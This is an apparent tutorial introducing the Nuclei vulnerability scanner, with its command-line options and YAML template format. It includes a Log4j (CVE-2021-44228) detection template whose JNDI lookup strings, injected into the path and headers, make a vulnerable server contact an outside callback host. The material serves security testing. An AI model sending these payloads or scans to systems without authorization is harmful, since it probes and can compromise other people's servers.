# Introducing Nuclei: A Fast and Customizable Vulnerability Scanner

## Introduction

[Nuclei](https://github.com/projectdiscovery/nuclei) is an open-source, fast, and customizable vulnerability scanner developed by [ProjectDiscovery](https://github.com/projectdiscovery/). It is designed to send requests across targets based on predefined templates, enabling efficient and accurate vulnerability detection with minimal false positives. [Nuclei](https://github.com/projectdiscovery/nuclei) supports scanning for various protocols, including TCP, DNS, HTTP, SSL, File, Whois, and Websocket.

## Some of the Key Features

1. Template-based scanning: Nuclei uses YAML-based templates to define scanning logic, making it highly extensible and customizable.

2. Multi-protocol support: Enables scanning across various network protocols and services.

3. Fast and efficient: Optimized for speed, allowing rapid scanning of large numbers of hosts.

4. Low false positives: Template-based approach helps minimize false positive results.

5. Community-driven: Large repository of community-contributed templates for detecting various vulnerabilities.

6. Easy integration: Can be easily integrated into CI/CD pipelines and other automated security workflows.

## Usage Examples

### Basic Scanning

To scan a single target using Nuclei:

```bash
nuclei -u http://10.6.6.23
```

To scan multiple targets from a file:

```bash
nuclei -l targets.txt
```

### Using Specific Templates

Scan with particular templates:

```bash
nuclei -u https://example.com -t cves/ -t exposures/
```

### Filtering Templates

Scan using templates with specific tags:

```bash
nuclei -u https://example.com -tags cve,oast
```

Exclude certain tags:

```bash
nuclei -u https://example.com -etags dos,fuzz
```

### Output Formatting

Generate JSON output:

```bash
nuclei -u https://example.com -json-output results.json
```

### Rate Limiting

Limit requests per second:

```bash
nuclei -u https://example.com -rate-limit 100
```

## Creating Nuclei Templates

Nuclei templates are YAML files that define the scanning logic. Here's a basic structure of a Nuclei template:

```yaml
id: example-template
info:
  name: Example Vulnerability Check
  author: YourName
  severity: medium
  description: Checks for an example vulnerability
  
requests:
  - method: GET
    path:
      - "{{BaseURL}}/vulnerable-endpoint"
    matchers:
      - type: word
        words:
          - "vulnerable string"
```

Key components of a template:

1. `id`: Unique identifier for the template
2. `info`: Metadata about the template
3. `requests`: Defines the HTTP requests to be made
4. `matchers`: Specifies conditions to identify vulnerabilities

### Example: CVE Detection Template

Here's an example template for detecting CVE-2021-44228 (Log4j vulnerability):

```yaml
id: CVE-2021-44228

info:
  name: Apache Log4j RCE
  author: pdteam
  severity: critical
  description: Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker-controlled LDAP and other JNDI related endpoints.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228

requests:
  - raw:
      - |
        GET /${jndi:ldap://{{interactsh-url}}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: ${jndi:ldap://{{interactsh-url}}}
        Referer: ${jndi:ldap://{{interactsh-url}}}

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"

      - type: regex
        part: interactsh_request
        regex:
          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
```

This template sends requests with JNDI lookup strings in various HTTP headers and checks for DNS or HTTP callbacks to detect the Log4j vulnerability[8].

## Best Practices for Template Creation

1. Use clear and descriptive template IDs and names
2. Include accurate metadata (author, severity, description)
3. Utilize dynamic variables like `{{BaseURL}}` for flexibility
4. Implement precise matchers to reduce false positives
5. Test templates thoroughly before submission
6. Follow the [community template contributions](https://github.com/projectdiscovery/nuclei-templates/tree/main/dns)

